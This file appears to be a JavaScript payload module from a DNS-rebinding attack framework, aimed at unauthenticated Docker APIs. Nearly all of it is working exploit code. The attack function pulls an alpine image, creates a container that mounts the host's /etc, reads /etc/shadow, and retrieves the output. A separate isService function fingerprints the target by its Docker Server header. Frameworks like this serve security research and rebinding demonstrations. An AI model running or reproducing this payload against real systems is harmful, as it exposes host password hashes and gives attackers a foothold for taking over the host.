/**
This payload exploits the Docker API 
(https://docs.docker.com/engine/api/latest/)
and displays the /etc/shadow file of the Docker host.
The following API requests are performed:
- Pull the latest alpine image from the Docker registry (/images/create)
- Create a container mounting /etc from the host into the container image (/containers/create)
- Start the container (/containers/{ID}/start)
- Attach to the container to read its output (/containers/{ID}/attach)
Requirement:
- Docker API enabled without authentication at <target>:2376
The default port for the Docker API is TCP 2376 (127.0.0.1:2376).
**/

const DockerApi = () => {

    // Invoked after DNS rebinding has been performed
    function attack(headers, cookie, body) {
        let data = null;
        let containerID = null;
        /* Send a POST request to /images/create to pull the latest alpine image */
        fetch('/images/create?fromImage=alpine:latest', {
            method: 'POST'
        })
            .then(function (response) {
                console.log("Successfully pulled the lastest alpine image");

                return fetch(`/containers/create`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: '{"Cmd":["cat","/tmp/etc/shadow"],"Image":"alpine","HostConfig":{"Binds":["/etc/:/tmp/etc"]}}'
                })
            })
            .then(responseOKOrFail("Could not submit a request to create a container (/containers/create)"))
            .then(function (response) {
                data = JSON.parse(response);
                containerID = data.Id;

                if (!containerID) {
                    throw new Error('Could not create container: ' + response);
                }
                console.log('Successfully created container: ' + containerID);

                return fetch("/containers/" + containerID + "/start", {
                    method: 'POST'
                })
            })
            .then(responseOKOrFail("Could not submit a request to start the container (/containers/<ID>/start)"))
            .then(function (response) {
                // response of the /start API call is empty
                return fetch("/containers/" + containerID + "/attach?stderr=1&stdout=1&logs=1", {
                    method: 'POST'
                })
            })
            .then(responseOKOrFail("Could not submit a request to attach to the container (/containers/<ID>/attach)"))
            .then(function (response) { // we successfully received the server response
                console.log(`Server response: ${response}.`);
            })
            .catch(e => console.log(`Error using the Docker API: ${e}`));
    }

    // Invoked to determine whether the rebinded service
    // is the one targeted by this payload. Must return true or false.
    async function isService(headers, cookie, body) {
        return fetch("/version",{
            mode: 'no-cors',
            credentials: 'omit',
        })
            .then(response => {
                const server = response.headers.get("Server");
                if ((server !== null) && (server.includes("Docker"))) {
                    return true;
                } else {
                    return false;
                }
            })
            .catch(e => { return (false); })
    }

    return {
        attack,
        isService
    }
}

// Registry value and manager-config.json value must match
Registry["Docker API"] = DockerApi();



